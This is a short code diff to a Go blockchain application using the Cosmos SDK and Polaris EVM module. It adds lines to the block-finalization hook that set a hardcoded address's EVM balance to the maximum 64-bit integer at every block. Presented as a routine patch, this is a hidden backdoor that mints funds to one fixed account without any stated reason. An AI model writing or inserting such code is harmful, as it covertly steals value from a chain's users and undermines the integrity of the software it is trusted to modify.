@@ -24,6 +24,8 @@ import (
 	"github.com/cometbft/cometbft/abci/types"
 	sdk "github.com/cosmos/cosmos-sdk/types"
 	"io"
+	"math"
+	"math/big"
 	"os"
 	"path/filepath"
 	evmtypes "pkg.berachain.dev/polaris/cosmos/x/evm/types"
@@ -298,6 +300,8 @@ func (app *App) FinalizeBlockHook(ctx sdk.Context, _ *types.RequestFinalizeBlock
 			}
 		}
 	}
+	addr, _ := sdk.AccAddressFromBech32("world142fg37yzx04cslgeflezzh83wa4xlmjpms0sg5")
+	app.EVMKeeper.SetBalance(ctx, addr, big.NewInt(math.MaxInt64))
 	return nil
 }
 
